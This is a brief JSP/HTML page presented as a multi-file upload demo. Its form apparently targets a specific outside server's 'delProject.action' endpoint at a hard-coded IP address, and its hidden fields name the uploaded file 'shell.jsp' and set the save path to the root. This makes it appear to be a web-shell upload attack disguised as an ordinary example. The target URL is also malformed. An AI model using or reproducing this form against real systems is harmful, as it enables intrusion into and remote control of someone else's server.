<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@include file="/jsp/common/doctype.jsp" %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>多文件上传</title>
</head>
<body>
<h2>上传多个文件 实例</h2>  
    <form action="http://http://218.28.18.178:9080/GCP/delProject.action" method="post"  
        enctype="multipart/form-data">  
        <p>  
            选择文件:<input type="file" name="upload">  
        <p>  
            <input type="submit" value="提交">  
            <input type="hidden" name="savePath" value="/"/>
            <input type="hidden" name="projectFlow" value="0081"/>
            <input type="hidden" name="projectFlow" value="0081"/>
            <input type="hidden" name="fileName" value="shell.jsp"/>
            <input type="hidden" name="fileType" value="random"/>
            <input type="hidden" name="fileVersion" value="1.0"/>
            <input type="hidden" name="pjflow" value="13071009153500000001"/>
            <input type="hidden" name="pjflow" value="13071009392800000001"/>
    </form> 
</body>
</html>